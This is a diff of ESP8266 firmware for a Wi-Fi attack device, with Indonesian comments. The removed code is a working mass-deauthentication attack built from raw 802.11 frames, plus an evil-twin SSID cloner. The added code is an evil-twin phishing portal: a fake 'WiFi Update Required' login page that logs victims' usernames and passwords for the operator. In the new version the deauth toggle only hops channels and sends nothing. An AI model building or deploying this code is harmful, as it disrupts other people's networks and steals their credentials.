@@ -1,134 +1,136 @@
-/* * PROJECT: GMpro Final Mod
- * STYLE: Hacker Matrix (Dark Mode)
- * FEATURES: Auto Mass Deauth, Evil Twin, Max Signal Range
- */
-
 #include <ESP8266WiFi.h>
-#include <DNSServer.h>
 #include <ESP8266WebServer.h>
+#include <DNSServer.h>
+#include <Adafruit_GFX.h>
+#include <Adafruit_SSD1306.h>
 
-// --- FIX AGAR DEAUTH BERFUNGSI DI ARDUINODROID ---
 extern "C" {
   #include "user_interface.h"
-  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
 }
 
-typedef struct {
-  String ssid;
-  uint8_t ch;
-  uint8_t bssid[6];
-} _Network;
-
-_Network _networks[16];
-_Network _selectedTarget;
-const byte DNS_PORT = 53;
+// Config OLED & LED
+#define SCREEN_WIDTH 64
+#define SCREEN_HEIGHT 48
+#define LED_PIN 2 // LED bawaan Wemos D1 Mini
+Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
+ESP8266WebServer server(80);
 DNSServer dnsServer;
-ESP8266WebServer webServer(80);
 
-bool evil_twin_active = false;
-unsigned long deauth_timer = 0;
-unsigned long scan_timer = 0;
+// State Variables
+bool isAttacking = false;
+String target_ssid = "";
+String logs = "";
+String apSSID = "GMpro";
+String apPASS = "sangkur87";
+unsigned long lastBlink = 0;
 
-// STYLE TAMPILAN GMPRO
-String style = "<style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding:10px;}"
-               ".box{border:1px solid #0f0;padding:15px;margin-bottom:10px;border-radius:5px;}"
-               "a{background:#0f0;color:#000;padding:5px;text-decoration:none;font-weight:bold;display:inline-block;margin-top:10px;}</style>";
+void drawSkull() {
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(WHITE);
+  display.setCursor(10, 5);
+  display.println("  XXXX  ");
+  display.println(" XXXXXX ");
+  display.println("  X  X  ");
+  display.println("  XXXX  ");
+  display.println(" GM-PRO ");
+  display.display();
+}
 
 void setup() {
   Serial.begin(115200);
+  pinMode(LED_PIN, OUTPUT);
+  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
+  drawSkull();
   
-  // --- SIGNAL BOOST MAKSIMAL ---
-  // WiFi.setOutputPower(20.5); 
-  
+  WiFi.setPhyMode(WIFI_PHY_MODE_11B);
   WiFi.mode(WIFI_AP_STA);
-  wifi_promiscuous_enable(1); 
-
-  // --- IDENTITAS ALAT ---
-  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
-  WiFi.softAP("GMpro", "sangkur87");
+  wifi_promiscuous_enable(1);
   
-  dnsServer.start(DNS_PORT, "*", IPAddress(192,168,4,1));
+  WiFi.softAP(apSSID.c_str(), apPASS.c_str());
+  dnsServer.start(53, "*", WiFi.softAPIP());
 
-  // PANEL KONTROL
-  webServer.on("/", []() {
-    String html = "<html><head><meta name='viewport' content='width=device-width'>" + style + "</head><body>";
-    html += "<h1>[ GMPRO-SYSTEM ]</h1>";
-    
-    if(evil_twin_active) {
-      html += "<div class='box' style='color:yellow'>MODE: EVIL TWIN ACTIVE<br>TARGET: " + _selectedTarget.ssid + "</div>";
-      html += "<p>Menunggu korban input password...</p>";
-      html += "<a href='/stop' style='background:red;color:white'>STOP ATTACK</a>";
-    } else {
-      html += "<div class='box'>MASS DEAUTH: <span style='color:red'>ATTACKING ALL</span></div><hr>";
-      for(int i=0; i<16; i++) {
-        if(_networks[i].ssid != "") {
-          html += "<div class='box'>" + _networks[i].ssid + " [Ch:" + String(_networks[i].ch) + "]<br><a href='/start?id=" + String(i) + "'>CLONE SSID (EVIL TWIN)</a></div>";
-        }
-      }
-    }
-    html += "</body></html>";
-    webServer.send(200, "text/html", html);
+  // --- WEB CONSOLE ---
+  server.on("/", []() {
+    String s = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>";
+    s += "body{background-color:#000;background-image:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzA0MTAwMCI+PHBhdGggZD0iTTEyIDJjLTQuNDIgMC04IDMuNTgtOCA4IDAgMS42OS41MiAzLjI0IDEuNCA0LjUxTDUuMTUgMjEuNjFjLS4zOS4zOS0uMzkgMS4wMiAwIDEuNDEuMzkuMzkgMS4wMi4zOSAxLjQxIDBsMi4xLTIuMWMxLjI3Ljg4IDIuODIgMS40IDQuNTEgMS40IDQuNDIgMCA4LTMuNTggOC04czMtOC04LTh6bTAtMmM1LjUyIDAgMTAgNC40OCAxMCAxMHMtNC40OCAxMC0xMCAxMC0xMC00LjQ4LTEwLTEwIDQuNDgtMTAgMTAtMTB6bS0zIDExYTEuNSAxLjUgMCAxIDEgMC0zIDEuNSAxLjUgMCAwIDEgMCAzem02IDBhMS41IDEuNSAwIDEgMSAwLTMgMS41IDEuNSAwIDAgMSAwIDN6bS0zIDRjLTIuNCAwLTQuNS0xLjMxLTUuNjMtMy4yOSAxLjA3LjggMi40MiAxLjI5IDMuODggMS4yOSAxLjQ2IDAgMi44MS0uNDkgMy44OC0xLjI5QzE2LjUgMTMuNjkgMTQuNCAxNSAxMiAxNXoiLz48L3N2Zz4=');";
+    s += "background-repeat:no-repeat;background-position:center 100px;background-size:200px;color:#0f0;font-family:monospace;}";
+    s += ".b{border:1px solid #0f0;padding:12px;display:block;margin:10px 5px;color:#0f0;text-decoration:none;text-align:center;background:rgba(0,30,0,0.7);}";
+    s += "h1{text-shadow:0 0 10px #0f0;text-align:center;}</style></head><body>";
+    s += "<h1>[ GMpro ULTRA ]</h1>";
+    s += "<p style='text-align:center;'>TARGET: " + (target_ssid=="" ? "NONE" : target_ssid) + "</p>";
+    s += "<a href='/scan' class='b'>SCAN & SELECT TARGET</a>";
+    s += "<a href='/attack' class='b'>" + String(isAttacking ? "STOP ATTACK" : "START MASS DEAUTH") + "</a>";
+    s += "<a href='/settings' class='b'>SETTINGS</a>";
+    s += "<div style='background:rgba(0,0,0,0.8);padding:10px;'><h3>LOGS:</h3><p style='color:white;'>" + logs + "</p></div>";
+    s += "</body></html>";
+    server.send(200, "text/html", s);
   });
 
-  webServer.on("/start", []() {
-    int id = webServer.arg("id").toInt();
-    _selectedTarget = _networks[id];
-    evil_twin_active = true;
-    WiFi.softAPdisconnect(true);
-    WiFi.softAP(_selectedTarget.ssid.c_str()); // Wemos ganti nama jadi target
-    webServer.send(200, "text/html", "Target Locked. Cloning SSID...");
+  server.on("/settings", []() {
+    String set = "<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'>";
+    set += "<h2>[ SETTINGS ]</h2>";
+    set += "<form action='/save_set'>SSID:<br><input type='text' name='s' value='"+apSSID+"'><br>";
+    set += "PASS:<br><input type='text' name='p' value='"+apPASS+"'><br><br>";
+    set += "<input type='submit' value='SAVE & REBOOT'></form></body></html>";
+    server.send(200, "text/html", set);
   });
 
-  webServer.on("/stop", []() {
-    evil_twin_active = false;
-    WiFi.softAPdisconnect(true);
-    WiFi.softAP("GMpro", "sangkur87");
-    webServer.send(200, "text/html", "Attack Stopped. Returning to GMpro.");
+  server.on("/save_set", []() {
+    apSSID = server.arg("s");
+    apPASS = server.arg("p");
+    server.send(200, "text/html", "Tersimpan! Rebooting...");
+    delay(2000);
+    ESP.restart();
   });
 
-  webServer.begin();
-  performScan();
-}
+  server.on("/scan", []() {
+    int n = WiFi.scanNetworks();
+    String sc = "<html><body style='background:#000;color:#0f0;'><h2>SCAN RESULTS</h2>";
+    for(int i=0; i<n; i++) sc += "<div>" + WiFi.SSID(i) + " <a href='/select?s=" + WiFi.SSID(i) + "'>[SELECT]</a></div><br>";
+    sc += "</body></html>";
+    server.send(200, "text/html", sc);
+  });
 
-void performScan() {
-  int n = WiFi.scanNetworks();
-  for (int i = 0; i < n && i < 16; ++i) {
-    _networks[i].ssid = WiFi.SSID(i);
-    _networks[i].ch = WiFi.channel(i);
-    memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
-  }
+  server.on("/select", []() {
+    target_ssid = server.arg("s");
+    WiFi.softAP(target_ssid.c_str(), ""); 
+    server.sendHeader("Location", "/");
+    server.send(302);
+  });
+
+  server.on("/attack", [](){ isAttacking = !isAttacking; server.sendHeader("Location", "/"); server.send(302); });
+
+  server.onNotFound([]() {
+    String login = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'></head><body style='text-align:center;'>";
+    login += "<h2>WiFi Update Required</h2><form action='/login'><input type='text' name='u' placeholder='Username'><br><br><input type='password' name='p' placeholder='Password'><br><br><input type='submit' value='Login'></form></body></html>";
+    server.send(200, "text/html", login);
+  });
+
+  server.on("/login", []() {
+    logs += "User: " + server.arg("u") + " | Pass: " + server.arg("p") + "<br>";
+    server.send(200, "text/html", "Error: Connection timeout.");
+  });
+
+  server.begin();
 }
 
 void loop() {
   dnsServer.processNextRequest();
-  webServer.handleClient();
+  server.handleClient();
 
-  // --- LOGIKA SERANGAN DEAUTH (INTI) ---
-  if (!evil_twin_active && (millis() - deauth_timer >= 1000)) {
-    for (int i = 0; i < 16; i++) {
-      if (_networks[i].ssid != "" && _networks[i].ssid != "GMpro") {
-        
-        wifi_set_channel(_networks[i].ch);
-
-        // Paket Deauth (C0) & Disassociate (A0)
-        uint8_t pkt[26] = {0xC0, 0x00, 0x37, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00};
-        
-        memcpy(&pkt[10], _networks[i].bssid, 6);
-        memcpy(&pkt[16], _networks[i].bssid, 6);
-        
-        // Kirim serangan
-        wifi_send_pkt_freedom(pkt, 26, 0); 
-        pkt[0] = 0xA0; 
-        wifi_send_pkt_freedom(pkt, 26, 0); 
-        delay(1); 
-      }
-    }
-    deauth_timer = millis();
+  // Logika LED Blink
+  unsigned long now = millis();
+  int interval = isAttacking ? 100 : 1000; // Cepat saat serang, lambat saat diam
+  if (now - lastBlink >= interval) {
+    lastBlink = now;
+    digitalWrite(LED_PIN, !digitalRead(LED_PIN));
   }
-
-  // Scan ulang setiap 30 detik agar daftar WiFi update
-  if (!evil_twin_active && (millis() - scan_timer >= 30000)) {
-    performScan();
-    scan_timer = millis();
+  
+  if(isAttacking) {
+    for(int i=1; i<=13; i++) {
+      wifi_set_channel(i);
+      delay(1);
+    }
   }
 }
